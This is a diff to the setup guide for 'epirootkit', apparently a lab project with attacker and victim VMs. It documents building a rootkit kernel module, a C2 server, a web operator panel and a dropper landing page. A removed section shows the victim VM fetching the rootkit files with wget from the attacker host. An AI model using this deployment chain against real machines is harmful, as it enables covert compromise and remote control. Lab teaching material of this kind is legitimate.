@@ -15,7 +15,7 @@ weight: 203
 
 1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
 2. **VM disk**: `attacker.qcow2` in `/var/lib/libvirt/images/`
-3. **VM launched**: `sudo ./scripts/run_vms.sh attacker`
+3. **VM launched**: `sudo ./scripts/run_vms.sh`
 
 
 ## VM Access
@@ -35,16 +35,44 @@ Everything is pre-configured. Build and run immediately:
 
 ```bash
 # Inside attacker VM (auto-logged in)
-cd epirootkit
-
-# Build rootkit + Start C2 server + Web UI
-cd .. && ./deploy_c2.sh
+cd epirootkit && ./deploy_c2.sh
 # ✅ Builds rootkit automatically
+# ✅ Builds dropper app
 # ✅ C2 server: port 4444
 # ✅ Web interface: port 3000
+# ✅ Landing page dropper: port 8080
 ```
 
-**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser
+### Deploy Script Options
+
+The `deploy_c2.sh` script supports selective component building:
+
+```bash
+# Build everything (default)
+./deploy_c2.sh
+
+# Build only specific components
+./deploy_c2.sh -r                # Build only rootkit (epirootkit.ko)
+./deploy_c2.sh --c2              # Build only C2 server and web interface
+./deploy_c2.sh -d                # Build only dropper and landing page
+
+# Build without starting servers
+./deploy_c2.sh --no-start        # Build all components but don't start servers
+./deploy_c2.sh --c2 --no-start   # Build C2 without starting servers
+
+# Combine options
+./deploy_c2.sh -r -d             # Build rootkit and dropper only
+
+# Get help
+./deploy_c2.sh -h                # Show all available options
+```
+
+**Available Options:**
+- `-r, --rootkit`: Build only rootkit kernel module
+- `--c2`: Build only C2 server and web interface
+- `-d, --dropper`: Build only dropper and start landing page
+- `--no-start`: Build components but don't start servers
+- `-h, --help`: Show help message
 
 {{% /tab %}}
 
@@ -67,16 +95,12 @@ wget http://192.168.200.1:8080/setup_attacker.sh
 chmod +x setup_attacker.sh
 ```
 
-
-
 **Option 2: Download from GitHub Gist**
 
 ```bash
 wget https://gist.githubusercontent.com/KazeTachinuu/397da3d739384de9e592a2e6f26b7cc0/raw/0895738fbf9dccc16dd6fe1139eb206ec9024076/setup_attacker.sh
 chmod +x setup_attacker.sh
-
 ```
-
 
 ### Setup
 
@@ -89,7 +113,6 @@ This installs:
 - Node.js 18.x LTS
 - Build tools (gcc, make, linux-headers-$(uname -r), python3)
 - SSH server
-
 
 **2. Deploy Project (from host):**
 ```bash
@@ -105,28 +128,18 @@ cd epirootkit && ./deploy_c2.sh
 # ✅ Starts C2 server + Web UI
 ```
 
-**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser
+**Note:** The `deploy_c2.sh` script supports the same selective building options as shown in the Pre-built tab.
 
 
 {{% /tab %}}
 
 {{< /tabs >}}
 
-#### Deploy to Victim
+## Access URLs
 
-Transfer rootkit to victim VM:
-
-```bash
-# Option A: SCP
-# SCP is like cp (copy) but with SSH
-scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/
-
-# Option B: HTTP server
-cd rootkit && python3 -m http.server 8080
-# Victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}
-
-# Option C: Web UI file transfer
-```
+Once deployed, access the C2 infrastructure at:
+- **Web Interface**: `http://192.168.200.11:3000` (from host) or `http://localhost:3000` (from attacker VM)
+- **Landing Page**: `http://192.168.200.11:8080` (from host) or `http://localhost:8080` (from attacker VM)
 
 ## Configuration
 
@@ -134,12 +147,13 @@ cd rootkit && python3 -m http.server 8080
 - **Builds rootkit**: Compiles `epirootkit.ko` for victim
 - **C2 server**: Port 4444 (client connections)
 - **Web interface**: Port 3000 (operator access)
-- **File transfer**: Deploys payload to victim
+- **Landing page dropper**: Port 8080 (dropper access)
 
 ### Network
 - **Attacker IP**: `192.168.200.11`
 - **C2 port**: `4444` (default)
 - **Web UI**: `http://192.168.200.11:3000`
+- **Landing page dropper**: `http://192.168.200.11:8080`
 
 ## Next Steps
 
